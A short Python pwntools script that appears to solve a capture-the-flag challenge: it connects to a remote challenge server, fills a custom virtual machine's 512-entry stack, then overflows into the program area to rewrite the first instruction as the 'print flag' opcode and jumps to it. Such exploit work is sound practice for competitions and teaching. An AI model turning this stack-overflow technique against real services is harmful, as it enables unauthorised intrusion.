#!/usr/bin/env python3
from pwn import *

# Set up connection
# r = process(['python3', 'chall.py']) # Local testing
r = remote('chall.polygl0ts.ch', 6042)

# Construct payload
# 1. Fill the stack (512 entries)
payload_ops = ["push_0"] * 512

# 2. Overwrite Opcode of Instruction 0 with 11 (0xb - print flag)
payload_ops.append("push_11")

# 3. Overwrite Operand of Instruction 0 with 0 (and setup jump target)
payload_ops.append("push_0")

# 4. Jump to Instruction 0
payload_ops.append("jmp")

# Join with '|' as per challenge format
payload = "|".join(payload_ops)

# Receive prompt
r.recvuntil(b"becomes 'main:|push_5|call_main'")
r.recvline() # consumes the blank line or prompt newline

# Send payload
print(f"Sending payload of length {len(payload)}...")
r.sendline(payload.encode())

# Receive flag
r.interactive()